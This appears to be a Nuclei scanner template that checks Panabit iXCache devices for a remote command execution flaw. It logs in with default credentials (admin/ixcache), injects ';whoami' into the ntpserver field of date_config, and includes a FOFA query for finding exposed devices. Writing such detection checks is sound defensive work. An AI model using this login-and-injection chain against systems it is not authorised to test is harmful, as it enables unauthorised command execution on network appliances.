http:
- attack: pitchfork
  matchers:
  - part: body
    regex:
    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)
    type: regex
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - ixcache
    username:
    - admin
  raw:
  - 'POST /login/userverify.cgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}

    '
  - 'POST /cgi-bin/Maintain/date_config HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    ntpserver=0.0.0.0;whoami&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1

    '
id: panabit-ixcache-rce
info:
  author: momika233
  description: 'Panabit iXCache date_config module has command splicing, resulting
    in the execution of arbitrary commands.

    '
  metadata:
    fofa-query: title="iXCache"
    max-request: 2
    veified: true
  name: Panabit iXCache date_config - Remote Code Execution
  reference:
  - https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Panabit%20iXCache%20date_config%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/Panabit/Panabit%20iXCache%20date_config%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  severity: critical
  tags: panabit,rce,ixcache,intrusive,iot,vuln
